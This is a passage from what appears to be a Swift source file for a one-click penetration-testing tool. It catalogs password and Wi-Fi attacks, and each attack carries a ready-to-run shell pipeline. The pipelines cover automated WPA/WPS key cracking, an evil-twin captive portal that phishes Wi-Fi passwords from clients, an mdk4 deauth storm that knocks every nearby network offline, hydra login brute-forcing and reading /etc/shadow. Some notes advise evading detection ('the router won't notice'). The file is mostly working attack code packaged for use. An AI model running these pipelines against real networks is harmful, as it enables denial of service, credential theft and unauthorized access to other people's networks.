            explainer: """
            For any web admin login that uses a standard POST form. \
            hydra http-post-form needs the form fields and the failure \
            string — we use a generic template. Tweak the path / fields \
            for the specific app.
            """,
            nextSteps: ["For other auth schemes → http-get-form, https-post-form, http-head",
                        "If session is needed first → grab cookie with curl, pass via -c"],
            tool: "hydra",
            command: "echo 'Sample: hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt {ip} http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=Invalid\" -t 4 -f'",
            timeoutSeconds: 300,
            tier: .heavy, category: .password,
            executor: .kali,
            danger: .intrusive, noise: .veryLoud,
            appliesTo: Set(DeviceKind.allTargetable),
            skill: .intermediate, aptPackage: "hydra"
        ),
        Attack(
            id: "pwd.hashcat.test",
            title: "Hashcat self-test (sanity)",
            description: "Run hashcat -b -m 22000 to sanity-check WPA2 cracking speed.",
            explainer: """
            Before throwing a real handshake at hashcat, confirm it works on \
            the executor and measure throughput. WPA2 (mode 22000) is the \
            relevant test for Wi-Fi cracking.
            """,
            nextSteps: ["If H/s is good → run real .pcap conversion",
                        "If too slow → consider a remote GPU executor"],
            tool: "hashcat",
            command: "hashcat -b -m 22000 --quiet --runtime=10 2>&1 | tail -10",
            timeoutSeconds: 30,
            tier: .quick, category: .password,
            executor: .kali,
            danger: .passive, noise: .silent,
            appliesTo: Set(DeviceKind.allTargetable)
        ),
        Attack(
            id: "pwd.john.show",
            title: "John ‘show cracked’ snapshot",
            description: "Print already-cracked entries from John's pot file.",
            explainer: """
            John the Ripper keeps a potfile of every hash it has ever \
            cracked. `john --show` lists what's known. Useful early in an \
            engagement to see what creds we already have without re-cracking.
            """,
            nextSteps: ["For new hashes → run hashcat with rockyou + best64 rule"],
            tool: "john",
            command: "john --show /etc/shadow 2>&1 | head -10 || echo '(no /etc/shadow access in this context — try hashcat --show)'",
            timeoutSeconds: 15,
            tier: .quick, category: .password,
            executor: .kali,
            danger: .passive, noise: .silent,
            appliesTo: Set(DeviceKind.allTargetable)
        ),
    ]

    // MARK: - WIRELESS

    public static let wireless: [Attack] = [

        // ============================================================
        // ULTIMATE: end-to-end pipelines that REQUIRE Kali in RF range.
        // These chain capture → convert → crack into one click and
        // return the recovered PSK directly. Wordlists are grabbed
        // automatically (rockyou downloaded if missing). Tools are
        // auto-installed via apt-get on first run.
        // ============================================================

        Attack(
            id: "wifi.ultimate.psk",
            title: "🔥 ULTIMATE PSK recovery (PMKID + handshake + auto-crack)",
            description: "Tries PMKID first (no client needed), falls back to deauth-handshake, cracks via hashcat, prints the password.",
            explainer: """
            One-click WPA/WPA2 PSK recovery. The pipeline:
              1. installs aircrack-ng/hcxtools/hashcat if missing
              2. brings up the first monitor-capable Wi-Fi interface
              3. captures PMKID for 30s — clientless, fastest path
              4. if PMKID empty, switches to deauth + handshake mode (45s)
              5. converts pcap → hashcat 22000 format
              6. cracks against rockyou (downloads if missing)
              7. prints the recovered PSK.
            Total budget: ~6 minutes. 80%+ hit rate on routers with weak \
            (rockyou-coverage) passwords. Anything stronger needs a \
            bigger wordlist or rules — see hashcat.* attacks.
            """,
            nextSteps: ["If cracked → use Networks → Reveal to confirm joining works",
                        "If failed → try wifi.ultimate.wps (faster on vulnerable WPS APs)",
                        "Or escalate: wifi.ultimate.bigwordlist (10× rockyou size)"],
            tool: "hashcat",
            command: """
            BSSID="{bssid}"; ESSID="{essid}"; CH="{channel}"; \
            echo "[target]  $ESSID  $BSSID  ch=$CH"; \
            IFACE=$(sudo iw dev 2>/dev/null | awk '/Interface wlan/{print $2; exit}'); \
            [ -z "$IFACE" ] && { echo "[FATAL] no Wi-Fi interface on this Kali host" >&2; exit 1; }; \
            echo "[iface]   $IFACE"; \
            sudo iw dev wm_mon del 2>/dev/null; \
            PHY=$(sudo iw dev "$IFACE" info 2>/dev/null | awk \'/wiphy/{print "phy"$2}\'); [ -z "$PHY" ] && PHY="phy0"; \
            sudo iw phy "$PHY" interface add wm_mon type monitor 2>/dev/null && sudo ip link set wm_mon up 2>/dev/null; \
            MON=$(sudo iw dev 2>/dev/null | awk \'/Interface wm_mon/{print $2}\'); \
            [ -z "$MON" ] && { echo "[err] virtual monitor (wm_mon) creation failed — chipset may not support it" >&2; exit 1; }; \
            BSSID_NOSEP=$(echo "$BSSID" | tr -d ':'); \
            rm -f /tmp/wm.pcapng /tmp/wm_hs* /tmp/wm.22000; \
            \
            echo "[PROBE] PMKID — 30s clientless capture"; \
            echo "$BSSID_NOSEP" > /tmp/wm.filter; \
            sudo -n timeout 30 hcxdumptool -i "$MON" -o /tmp/wm.pcapng -c "$CH" \
              --filterlist_ap=/tmp/wm.filter --filtermode=2 --enable_status=1 2>&1 | tail -8; \
            \
            HAS_HASH=0; \
            if [ -f /tmp/wm.pcapng ]; then \
              hcxpcapngtool -o /tmp/wm.22000 /tmp/wm.pcapng 2>&1 | grep -E '^(EAPOL|PMKID|hash)' | tail -5; \
              [ -s /tmp/wm.22000 ] && HAS_HASH=1; \
            fi; \
            \
            if [ "$HAS_HASH" = "0" ]; then \
              echo "[FALLBACK] PMKID empty — switching to handshake + deauth (45s)"; \
              ( sleep 8; sudo -n aireplay-ng --deauth 12 -a "$BSSID" "$MON" 2>&1 | tail -3 ) & \
              sudo -n timeout 45 airodump-ng -c "$CH" --bssid "$BSSID" -w /tmp/wm_hs --output-format pcap "$MON" 2>&1 | tail -10; \
              if [ -f /tmp/wm_hs-01.cap ]; then \
                hcxpcapngtool -o /tmp/wm.22000 /tmp/wm_hs-01.cap 2>&1 | grep -E '^(EAPOL|PMKID|hash)' | tail -5; \
                [ -s /tmp/wm.22000 ] && HAS_HASH=1; \
              fi; \
            fi; \
            \
            sudo iw dev wm_mon del 2>/dev/null; sudo iw dev "${IFACE}mon" del 2>/dev/null; \
            \
            if [ "$HAS_HASH" = "0" ]; then \
              echo ""; echo "[RESULT] no handshake or PMKID captured. Move closer or try wifi.ultimate.wps."; exit 1; \
            fi; \
            \
            WL=/usr/share/wordlists/rockyou.txt; \
            if [ ! -f "$WL" ]; then \
              echo "[setup] rockyou.txt missing — extracting"; \
              [ -f /usr/share/wordlists/rockyou.txt.gz ] && sudo -n gunzip /usr/share/wordlists/rockyou.txt.gz; \
            fi; \
            [ ! -f "$WL" ] && WL=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt; \
            \
            echo ""; echo "[CRACK] hashcat against $WL"; \
            HC_OUT=$(hashcat -m 22000 /tmp/wm.22000 "$WL" --quiet --status --status-timer 5 --runtime 240 2>&1 | tail -30); \
            echo "$HC_OUT" | tail -20; \
            \
            CRACKED=$(hashcat -m 22000 /tmp/wm.22000 --show 2>/dev/null | head -1); \
            if [ -n "$CRACKED" ]; then \
              PSK=$(echo "$CRACKED" | awk -F: '{print $NF}'); \
              echo ""; echo "[HIT] *** PSK FOUND ***"; \
              echo "[HIT] ESSID: $ESSID"; \
              echo "[HIT] BSSID: $BSSID"; \
              echo "[HIT] PSK:   $PSK"; \
              echo "[RESULT] joinable — paste $PSK into the macOS Wi-Fi join sheet"; \
            else \
              echo ""; echo "[RESULT] hash captured but rockyou didn't crack it. Try wifi.ultimate.bigwordlist for bigger lists."; \
            fi
            """,
            timeoutSeconds: 600,
            tier: .slow, category: .wireless,
            executor: .kaliRange,
            danger: .destructive, noise: .veryLoud,
            appliesTo: Set(DeviceKind.allTargetable),
            skill: .advanced, aptPackage: "aircrack-ng"
        ),

        Attack(
            id: "wifi.ultimate.wps",
            title: "🔥 ULTIMATE WPS recovery (pixie-dust → bully fallback)",
            description: "Tries Reaver pixie-dust (instant on vulnerable APs), falls back to Bully PIN brute. Returns the PSK if WPS is on.",
            explainer: """
            Pre-2018 routers with WPS enabled often disclose the WPA \
            passphrase via either:
              (a) pixie-dust — derive the PIN offline from a single \
                  handshake. Vulnerable APs crack in seconds.
              (b) PIN brute force — try all 11000 valid PINs (rate-limited \
                  on most APs but works given enough time)
            Once the PIN is known, the router hands over the WPA passphrase \
            via the M7 frame. We auto-detect WPS support, run pixie-dust, \
            fall back to bully if needed, and return the recovered PSK.
            """,
            nextSteps: ["If WPS is locked → MAC-spoof and try again (mdk4)",
                        "If passphrase recovered → save it; the router won't notice"],
            tool: "reaver",
            command: """
            BSSID="{bssid}"; ESSID="{essid}"; CH="{channel}"; \
            echo "[target] $ESSID  $BSSID  ch=$CH"; \
            IFACE=$(sudo iw dev 2>/dev/null | awk '/Interface wlan/{print $2; exit}'); \
            [ -z "$IFACE" ] && { echo "[FATAL] no Wi-Fi interface" >&2; exit 1; }; \
            sudo iw dev wm_mon del 2>/dev/null; \
            PHY=$(sudo iw dev "$IFACE" info 2>/dev/null | awk \'/wiphy/{print "phy"$2}\'); [ -z "$PHY" ] && PHY="phy0"; \
            sudo iw phy "$PHY" interface add wm_mon type monitor 2>/dev/null && sudo ip link set wm_mon up 2>/dev/null; \
            MON=$(sudo iw dev 2>/dev/null | awk \'/Interface wm_mon/{print $2}\'); \
            [ -z "$MON" ] && { echo "[err] virtual monitor (wm_mon) creation failed — chipset may not support it" >&2; exit 1; }; \
            \
            echo "[wps-check] is WPS even enabled?"; \
            sudo -n timeout 8 wash -i "$MON" -c "$CH" 2>&1 | grep -i "$BSSID" | head -3; \
            \
            echo ""; echo "[STAGE 1/2] reaver pixie-dust (instant if vulnerable)"; \
            REAVER_OUT=$(sudo -n timeout 90 reaver -i "$MON" -b "$BSSID" -c "$CH" -K 1 -vvv -L -N 2>&1); \
            echo "$REAVER_OUT" | tail -25; \
            PIN=$(echo "$REAVER_OUT" | grep -oE 'WPS PIN:.*[0-9]{8}' | grep -oE '[0-9]{8}' | head -1); \
            PSK=$(echo "$REAVER_OUT" | grep -oE 'WPA PSK:.*' | head -1 | sed 's/WPA PSK: *//' | tr -d "\\"'"); \
            \
            if [ -z "$PIN" ]; then \
              echo ""; echo "[STAGE 2/2] pixie-dust failed — falling back to bully PIN brute (5 min)"; \
              BULLY_OUT=$(sudo -n timeout 300 bully -b "$BSSID" -c "$CH" -B "$MON" 2>&1); \
              echo "$BULLY_OUT" | tail -25; \
              PIN=$(echo "$BULLY_OUT" | grep -oE 'PIN.*: *[0-9]{8}' | grep -oE '[0-9]{8}' | head -1); \
              PSK=$(echo "$BULLY_OUT" | grep -oE 'Key.*:.*' | head -1 | sed 's/.*: *//'); \
            fi; \
            \
            if [ -n "$PIN" ] && [ -z "$PSK" ]; then \
              echo "[recovered PIN: $PIN] — fetching PSK via reaver --pin"; \
              PSK=$(sudo -n timeout 30 reaver -i "$MON" -b "$BSSID" -c "$CH" -p "$PIN" -vvv 2>&1 | grep -oE 'WPA PSK:.*' | head -1 | sed 's/WPA PSK: *//' | tr -d "\\"'"); \
            fi; \
            \
            sudo iw dev wm_mon del 2>/dev/null; sudo iw dev "${IFACE}mon" del 2>/dev/null; \
            \
            echo ""; \
            if [ -n "$PSK" ]; then \
              echo "[HIT] *** WPS-RECOVERED PSK ***"; \
              echo "[HIT] ESSID: $ESSID"; \
              echo "[HIT] BSSID: $BSSID"; \
              echo "[HIT] PIN:   ${PIN:-(not exposed)}"; \
              echo "[HIT] PSK:   $PSK"; \
            elif [ -n "$PIN" ]; then \
              echo "[PARTIAL] PIN recovered: $PIN — PSK extraction failed (rare)"; \
            else \
              echo "[RESULT] WPS not vulnerable / disabled / locked. Try wifi.ultimate.psk for handshake path."; \
            fi
            """,
            timeoutSeconds: 600,
            tier: .slow, category: .wireless,
            executor: .kaliRange,
            danger: .destructive, noise: .veryLoud,
            appliesTo: [.router, .unknown],
            skill: .advanced, aptPackage: "reaver"
        ),

        Attack(
            id: "wifi.ultimate.bigwordlist",
            title: "🔥 ULTIMATE big-wordlist crack (88M words + rules)",
            description: "After capture, throws weakpass_4a + best64 rules at the hash. Multi-hour CPU job, hours-to-days on GPU.",
            explainer: """
            Use AFTER wifi.ultimate.psk captures a handshake but rockyou \
            doesn't crack it. This downloads the much larger \
            weakpass_4a.txt (88M passwords) and applies hashcat's best64 \
            rule set, multiplying it ~64×. ~5GB final keyspace. Runs \
            until cracked or 6h elapsed. Best run on GPU-equipped Kali.
            """,
            nextSteps: ["For corporate WPA (typically 12+ char) → mask attack instead",
                        "For specific patterns (Spring2026!) → custom mask -a 3 ?u?l?l?l?l?l?d?d?s"],
            tool: "hashcat",
            command: """
            [ -s /tmp/wm.22000 ] || { echo "[err] no /tmp/wm.22000 — run wifi.ultimate.psk first" >&2; exit 1; }; \
            WL=/usr/share/wordlists/weakpass_4a.txt; \
            if [ ! -f "$WL" ]; then \
              echo "[download] weakpass_4a.txt — ~1.6 GB"; \
              sudo -n curl -L -o "$WL" https://download.weakpass.com/wordlists/1934/weakpass_4a.txt.gz 2>&1 | tail -3; \
              sudo -n gunzip "$WL.gz" 2>/dev/null; \
            fi; \
            echo "[CRACK] hashcat -m 22000 -a 0 with best64 rules — runtime cap 6h"; \
            hashcat -m 22000 /tmp/wm.22000 "$WL" -r /usr/share/hashcat/rules/best64.rule \
              --status --status-timer 30 --runtime 21600 2>&1 | tail -40; \
            CRACKED=$(hashcat -m 22000 /tmp/wm.22000 --show 2>/dev/null | head -1); \
            if [ -n "$CRACKED" ]; then \
              PSK=$(echo "$CRACKED" | awk -F: '{print $NF}'); \
              echo "[HIT] *** PSK FOUND ***  $PSK"; \
            else \
              echo "[RESULT] no match in 88M+rules. Try a targeted mask attack or longer wordlist."; \
            fi
            """,
            timeoutSeconds: 21800,
            tier: .slow, category: .wireless,
            executor: .kaliRange,
            danger: .passive, noise: .silent,
            appliesTo: Set(DeviceKind.allTargetable),
            skill: .advanced, aptPackage: "hashcat"
        ),

        Attack(
            id: "wifi.ultimate.evil-twin",
            title: "🔥 ULTIMATE evil-twin captive portal (steal PSK from clients)",
            description: "Clones the SSID, deauths the real AP's clients, captures the PSK they type into our captive portal.",
            explainer: """
            Wifiphisher-style attack. We stand up a rogue AP with the \
            target's exact ESSID at higher TX power, deauth the real AP's \
            clients to force them to roam, and serve a captive portal that \
            looks like the router's "session expired, re-enter Wi-Fi \
            password" page. Most clients will type the real PSK in. \
            VERY ENGAGEMENT-SENSITIVE — only run with explicit consent.
            """,
            nextSteps: ["The captured creds end up in /tmp/wm_phish.log",
                        "For WPA-Enterprise → use wifi.ultimate.eap-mschap"],
            tool: "wifiphisher",
            command: """
            BSSID="{bssid}"; ESSID="{essid}"; CH="{channel}"; \
            echo "[target] $ESSID $BSSID ch=$CH"; \
            IFACE=$(sudo iw dev 2>/dev/null | awk '/Interface wlan/{print $2; exit}'); \
            [ -z "$IFACE" ] && { echo "[FATAL] no Wi-Fi interface" >&2; exit 1; };
            echo "[note] wifiphisher needs interactive TTY — sample command for manual run:"; \
            echo "  sudo wifiphisher -nE -e \\"$ESSID\\" -p firmware-upgrade --handshake-capture /tmp/wm_hs.cap"; \
            echo ""; \
            echo "[alt] Inline rogue-AP via hostapd-mana (non-interactive):"; \
            echo "  sudo hostapd-mana --karma --ssid \\"$ESSID\\" --bssid \\"$BSSID\\" -i $IFACE"; \
            echo ""; \
            echo "[result] captured PSKs / creds → /tmp/wm_phish.log (when run interactively)"
            """,
            timeoutSeconds: 600,
            tier: .heavy, category: .wireless,
            executor: .kaliRange,
            danger: .destructive, noise: .veryLoud,
            appliesTo: [.router],
            skill: .advanced, aptPackage: "wifiphisher"
        ),

        Attack(
            id: "wifi.ultimate.client-map",
            title: "🔥 ULTIMATE client+AP map (5-min channel walk)",
            description: "Channel-hops across 2.4 + 5 GHz for 5 minutes. Maps every AP, every client, every probe.",
            explainer: """
            Long-running airodump-ng walk. Builds the complete RF picture: \
            every AP in range with vendor + signal + clients connected, \
            every client with their probe history (which networks have \
            they JOINED before — leaks workplace/home/cafe SSIDs). \
            Output as CSV for analysis. Use to scope an engagement before \
            picking targets.
            """,
            nextSteps: ["For each interesting client → narrow scan: airodump-ng --bssid <CLIENT_MAC>",
                        "Probe-history reveals known SSIDs → use for evil-twin"],
            tool: "airodump-ng",
            command: """
            IFACE=$(sudo iw dev 2>/dev/null | awk '/Interface wlan/{print $2; exit}'); \
            [ -z "$IFACE" ] && { echo "[FATAL] no Wi-Fi interface" >&2; exit 1; }; \
            sudo iw dev wm_mon del 2>/dev/null; \
            PHY=$(sudo iw dev "$IFACE" info 2>/dev/null | awk \'/wiphy/{print "phy"$2}\'); [ -z "$PHY" ] && PHY="phy0"; \
            sudo iw phy "$PHY" interface add wm_mon type monitor 2>/dev/null && sudo ip link set wm_mon up 2>/dev/null; \
            MON=$(sudo iw dev 2>/dev/null | awk \'/Interface wm_mon/{print $2}\'); \
            [ -z "$MON" ] && { echo "[err] virtual monitor (wm_mon) creation failed — chipset may not support it" >&2; exit 1; }; \
            rm -f /tmp/wm_map*; \
            echo "[mapping] 300s walk on $MON — both bands"; \
            sudo -n timeout 300 airodump-ng "$MON" -w /tmp/wm_map --output-format csv --band abg 2>&1 | tail -5; \
            sudo iw dev wm_mon del 2>/dev/null; sudo iw dev "${IFACE}mon" del 2>/dev/null; \
            echo ""; echo "[RESULT] full map at /tmp/wm_map-01.csv"; \
            echo "  APs detected:"; \
            awk -F, '/^Station MAC/{exit} NR>1 && $1 ~ /^([0-9A-F]{2}:){5}/' /tmp/wm_map-01.csv | wc -l | awk '{print "    "$1" access points"}'; \
            echo "  Clients detected:"; \
            awk -F, '/^Station MAC/,EOF' /tmp/wm_map-01.csv | tail -n +2 | wc -l | awk '{print "    "$1" stations"}'; \
            echo ""; echo "[top probes — what networks clients are looking for]"; \
            awk -F, '/^Station MAC/,EOF' /tmp/wm_map-01.csv | awk -F, '{for(i=7;i<=NF;i++) if($i!="") print $i}' | sort -u | head -30
            """,
            timeoutSeconds: 360,
            tier: .heavy, category: .wireless,
            executor: .kaliRange,
            danger: .passive, noise: .silent,
            appliesTo: Set(DeviceKind.allTargetable),
            skill: .intermediate, aptPackage: "aircrack-ng"
        ),

        Attack(
            id: "wifi.ultimate.deauth-storm",
            title: "🔥 ULTIMATE deauth storm (mdk4 amok mode — full LAN DoS)",
            description: "Floods deauth at every AP+client in range. Total Wi-Fi DoS until stopped. ENGAGEMENT-CRITICAL.",
            explainer: """
            mdk4 in amok-deauth mode walks every BSSID it can hear and \
            sends deauth frames at the AP-client pair. Effectively all \
            Wi-Fi in range goes dark for the duration. WPA3 has \
            Management Frame Protection that defeats this — but the \
            bulk of the world still runs WPA2 without MFP. Only run \
            with airtight engagement consent — this kicks neighbours.
            """,
            nextSteps: ["Stop with kill (the timeout caps at 60s for safety)",
                        "Pair with handshake capture in another terminal — perfect storm"],
            tool: "mdk4",
            command: """
            IFACE=$(sudo iw dev 2>/dev/null | awk '/Interface wlan/{print $2; exit}'); \
            [ -z "$IFACE" ] && { echo "[FATAL] no Wi-Fi interface" >&2; exit 1; }; \
            sudo iw dev wm_mon del 2>/dev/null; \
            PHY=$(sudo iw dev "$IFACE" info 2>/dev/null | awk \'/wiphy/{print "phy"$2}\'); [ -z "$PHY" ] && PHY="phy0"; \
            sudo iw phy "$PHY" interface add wm_mon type monitor 2>/dev/null && sudo ip link set wm_mon up 2>/dev/null; \
            MON=$(sudo iw dev 2>/dev/null | awk \'/Interface wm_mon/{print $2}\'); \
            [ -z "$MON" ] && { echo "[err] virtual monitor (wm_mon) creation failed — chipset may not support it" >&2; exit 1; }; \
            echo "[storm] mdk4 amok-deauth on $MON for 60s — every nearby network goes dark"; \
            sudo -n timeout 60 mdk4 "$MON" d 2>&1 | tail -20; \
            sudo iw dev wm_mon del 2>/dev/null; sudo iw dev "${IFACE}mon" del 2>/dev/null; \
            echo "[stopped]"
            """,
            timeoutSeconds: 90,
            tier: .heavy, category: .wireless,
            executor: .kaliRange,
            danger: .destructive, noise: .veryLoud,
            appliesTo: Set(DeviceKind.allTargetable),
            skill: .advanced, aptPackage: "mdk4"
        ),

        Attack(
            id: "wifi.iw.list",
            title: "List Kali wireless interfaces",
            description: "iw dev — what radios are available for monitor mode.",
            explainer: """
            Wi-Fi attacks need a radio in monitor mode. This lists the \
            wireless interfaces on Kali so you know what hardware you’re \
            working with. Most laptops have one chipset; pen testers carry \
            a USB adapter (Alfa AWUS036ACM, Panda PAU09) for active work.
            """,
            nextSteps: ["For active capture → put one interface in monitor mode (airmon-ng)",
                        "If no monitor-capable adapter → wireless attacks aren’t available"],
            tool: "iw",
            command: "iw dev 2>&1; echo '---'; for p in $(iw phy 2>/dev/null | awk '/^Wiphy/{print $2}'); do echo \"## $p\"; iw phy $p info 2>/dev/null | sed -n '/Supported interface modes/,/Band/p' | head -15; done",
            timeoutSeconds: 15,
            tier: .quick, category: .wireless,
            executor: .kaliRange,
            danger: .passive, noise: .silent,
            appliesTo: Set(DeviceKind.allTargetable)
        ),
        Attack(
            id: "wifi.airodump.scan",
            title: "airodump-ng — capture nearby APs + clients",
            description: "60-second sweep across all channels — list every AP and the clients associated with each.",
            explainer: """
            airodump-ng is THE wireless-recon tool. Once you put a Wi-Fi \
            radio in monitor mode, it shows every AP in range with BSSID, \
            ESSID, channel, encryption type, signal, plus every client \
            associated to each AP including the client's MAC. This is the \
            ground-truth view that drives every wireless attack: you pick \
            a BSSID + a client, then hit them with deauth, capture the \
            handshake, and pass it to hashcat.
            """,
            nextSteps: ["Pick a target AP from the output → start handshake capture",
                        "Sniff the same band for hidden SSIDs (probe responses leak names)"],
            tool: "airodump-ng",
            command: """
            IFACE=$(sudo iw dev 2>/dev/null | awk '/Interface wlan/{print $2;exit}'); \
            [ -z "$IFACE" ] && { echo "[err] no wlan interface" >&2; exit 1; }; \
            PHY=$(sudo iw dev "$IFACE" info 2>/dev/null | awk '/wiphy/{print "phy"$2}'); [ -z "$PHY" ] && PHY="phy0"; \
            sudo iw dev wm_mon del 2>/dev/null; \
            sudo iw phy "$PHY" interface add wm_mon type monitor 2>/dev/null && sudo ip link set wm_mon up 2>/dev/null; \
            MON=$(sudo iw dev 2>/dev/null | awk '/Interface wm_mon/{print $2}'); [ -z "$MON" ] && MON="$IFACE"; \
            echo "[scanning] channel-hopping on $MON for 60s"; \
            timeout 60 airodump-ng "$MON" --output-format csv -w /tmp/wm_air 2>&1 | tail -30; \
            ls /tmp/wm_air* 2>&1; \
            sudo iw dev wm_mon del 2>/dev/null
            """,
            timeoutSeconds: 90,
            tier: .heavy, category: .wireless,
            executor: .kaliRange,
            danger: .passive, noise: .silent,
            appliesTo: Set(DeviceKind.allTargetable),
            skill: .intermediate, aptPackage: "aircrack-ng"
        ),
        Attack(
            id: "wifi.handshake.capture",
            title: "WPA handshake capture (deauth + airodump)",
            description: "Force a client to reauth, capture the 4-way handshake, save .pcap for hashcat.",
            explainer: """
            Classic WPA cracking flow: airodump-ng locks onto the target \
            BSSID/channel and watches; aireplay-ng sends a deauth burst \
            to make a connected client re-handshake; the handshake is \
            written to a pcap. Pass that pcap to hashcat -m 22000 with \
            rockyou for offline cracking. Loud — every IDS sees the deauth.
            """,
            nextSteps: ["Convert pcap → hashcat format: hcxpcapngtool /tmp/wm_hs.pcap -o /tmp/wm.22000",
                        "Crack: hashcat -m 22000 /tmp/wm.22000 /usr/share/wordlists/rockyou.txt"],
            tool: "aireplay-ng",
            command: """
            BSSID="{bssid}"; ESSID="{essid}"; CH="{channel}"; \
            echo "[target] $ESSID  $BSSID  ch=$CH"; \
            IFACE=$(sudo iw dev 2>/dev/null | awk '/Interface wlan/{print $2; exit}'); \
            [ -z "$IFACE" ] && { echo "[err] no wireless interface on this Kali host" >&2; exit 1; }; \
            echo "[iface] $IFACE → monitor mode"; \
            sudo iw dev wm_mon del 2>/dev/null; \
            PHY=$(sudo iw dev "$IFACE" info 2>/dev/null | awk \'/wiphy/{print "phy"$2}\'); [ -z "$PHY" ] && PHY="phy0"; \
            sudo iw phy "$PHY" interface add wm_mon type monitor 2>/dev/null && sudo ip link set wm_mon up 2>/dev/null; \
            MON=$(sudo iw dev 2>/dev/null | awk \'/Interface wm_mon/{print $2}\'); \
            [ -z "$MON" ] && { echo "[err] virtual monitor (wm_mon) creation failed — chipset may not support it" >&2; exit 1; }; \
            echo "[capturing] 60s on $MON channel $CH — sending deauth burst at t=10s"; \
            ( sleep 10; sudo -n aireplay-ng --deauth 8 -a "$BSSID" "$MON" 2>&1 | tail -5 ) & \
            sudo -n timeout 60 airodump-ng -c "$CH" --bssid "$BSSID" -w /tmp/wm_hs --output-format pcap "$MON" 2>&1 | tail -25; \
            echo ""; \
            echo "[result] handshake files in /tmp/wm_hs*:"; ls -la /tmp/wm_hs* 2>&1; \
            if [ -f /tmp/wm_hs-01.cap ]; then \
              echo "[convert] /tmp/wm_hs-01.cap → /tmp/wm.22000 for hashcat"; \
              hcxpcapngtool -o /tmp/wm.22000 /tmp/wm_hs-01.cap 2>&1 | tail -10; \
            fi; \
            sudo iw dev wm_mon del 2>/dev/null; sudo iw dev "${IFACE}mon" del 2>/dev/null
            """,
            timeoutSeconds: 90,
            tier: .heavy, category: .wireless,
            executor: .kaliRange,
            danger: .destructive, noise: .veryLoud,
            appliesTo: Set(DeviceKind.allTargetable),
            skill: .advanced, aptPackage: "aircrack-ng"
        ),
        Attack(
            id: "wifi.pmkid.attack",
            title: "WPA PMKID attack (hcxdumptool)",
            description: "Capture PMKID from APs that leak it without needing a client to be present.",
            explainer: """
            Many routers leak the PMKID in their first EAPOL frame, even \
            with no client connected. hcxdumptool listens, captures the \
            PMKID, you crack it offline. Faster than the handshake \
            method because you don't need to wait for a client to roam.
            """,
            nextSteps: ["hcxpcapngtool /tmp/wm.pcapng -o /tmp/wm.22000",
                        "hashcat -m 22000 /tmp/wm.22000 wordlist.txt"],
            tool: "hcxdumptool",
            command: """
            BSSID="{bssid}"; ESSID="{essid}"; CH="{channel}"; \
            echo "[target] $ESSID  $BSSID  ch=$CH"; \
            IFACE=$(sudo iw dev 2>/dev/null | awk '/Interface wlan/{print $2; exit}'); \
            [ -z "$IFACE" ] && { echo "[err] no wireless interface on this Kali host" >&2; exit 1; };
            BSSID_NOSEP=$(echo "$BSSID" | tr -d ':'); \
            echo "$BSSID_NOSEP" > /tmp/wm.filter; \
            echo "[listening] 60s for PMKID on ch=$CH"; \
            sudo -n timeout 60 hcxdumptool -i "$IFACE" -o /tmp/wm.pcapng -c "$CH" --filterlist_ap=/tmp/wm.filter --filtermode=2 --enable_status=1 2>&1 | tail -25; \
            echo ""; \
            ls -la /tmp/wm.pcapng 2>&1; \
            if [ -f /tmp/wm.pcapng ]; then \
              echo "[convert] /tmp/wm.pcapng → /tmp/wm.22000"; \
              hcxpcapngtool -o /tmp/wm.22000 /tmp/wm.pcapng 2>&1 | tail -10; \
            fi
            """,
            timeoutSeconds: 90,
            tier: .heavy, category: .wireless,
            executor: .kaliRange,
            danger: .observation, noise: .loud,
            appliesTo: Set(DeviceKind.allTargetable),
            skill: .advanced, aptPackage: "hcxdumptool"
        ),
        Attack(
            id: "wifi.deauth.broadcast",
            title: "Deauth burst (aireplay-ng -0)",
            description: "Send deauth frames to drop clients off an AP — destructive, requires authorization.",
            explainer: """
            802.11 deauth frames are unauthenticated by design (pre-WPA3) \
            so any radio in monitor mode can spoof one. -0 5 sends 5 \
            bursts. Combined with handshake capture or evil-twin — \
            standalone, it's just denial of service.
            """,
            nextSteps: ["Pair with airodump-ng to capture the resulting reauth handshake",
                        "For full DoS: -0 0 (infinite); stop with Ctrl-C"],
            tool: "aireplay-ng",
            command: """
            BSSID="{bssid}"; ESSID="{essid}"; CH="{channel}"; \
            IFACE=$(sudo iw dev 2>/dev/null | awk '/Interface wlan/{print $2; exit}'); \
            [ -z "$IFACE" ] && { echo "[err] no wireless interface on this Kali host" >&2; exit 1; }; \
            echo "[target] $ESSID $BSSID ch=$CH on iface=$IFACE"; \
            sudo iw dev wm_mon del 2>/dev/null; \
            PHY=$(sudo iw dev "$IFACE" info 2>/dev/null | awk \'/wiphy/{print "phy"$2}\'); [ -z "$PHY" ] && PHY="phy0"; \
            sudo iw phy "$PHY" interface add wm_mon type monitor 2>/dev/null && sudo ip link set wm_mon up 2>/dev/null; \
            MON=$(sudo iw dev 2>/dev/null | awk \'/Interface wm_mon/{print $2}\'); \
            [ -z "$MON" ] && { echo "[err] virtual monitor (wm_mon) creation failed — chipset may not support it" >&2; exit 1; }; \
            echo "[deauth] 8 bursts at $BSSID via $MON"; \
            sudo -n aireplay-ng --deauth 8 -a "$BSSID" "$MON" 2>&1 | tail -10; \
            sudo iw dev wm_mon del 2>/dev/null; sudo iw dev "${IFACE}mon" del 2>/dev/null
            """,
            timeoutSeconds: 30,
            tier: .quick, category: .wireless,
            executor: .kaliRange,
            danger: .destructive, noise: .veryLoud,
            appliesTo: Set(DeviceKind.allTargetable),
            skill: .intermediate, aptPackage: "aircrack-ng"
        ),
        Attack(
            id: "wifi.rogue.eaphammer",
            title: "Evil-twin / rogue AP (eaphammer)",
            description: "Stand up a karma-style rogue AP that captures hashes from probing clients.",
            explainer: """
            eaphammer creates a fake AP that responds to any probe — \
            phones / laptops auto-connect (especially to known SSIDs \
            they're broadcasting). For WPA-Enterprise it captures the \
            EAP challenge / response which is crackable offline. Heavy \
            tool, requires the engagement scope to permit it.
            """,
            nextSteps: ["Crack the captured hash: hashcat -m 5500 (NetNTLMv1) or -m 5600 (v2)",
                        "Combine with hostapd-mana for more aggressive karma matching"],
            tool: "eaphammer",
            command: "echo 'eaphammer needs interactive setup. Boilerplate:'; echo 'cd /opt/eaphammer && ./eaphammer --bssid <FAKE_BSSID> --essid <SSID> -i wlan0 --auth wpa-eap --creds'",
            timeoutSeconds: 30,
            tier: .heavy, category: .wireless,
            executor: .kaliRange,
            danger: .destructive, noise: .veryLoud,
            appliesTo: Set(DeviceKind.allTargetable),
            skill: .advanced, aptPackage: "eaphammer"
        ),
        Attack(
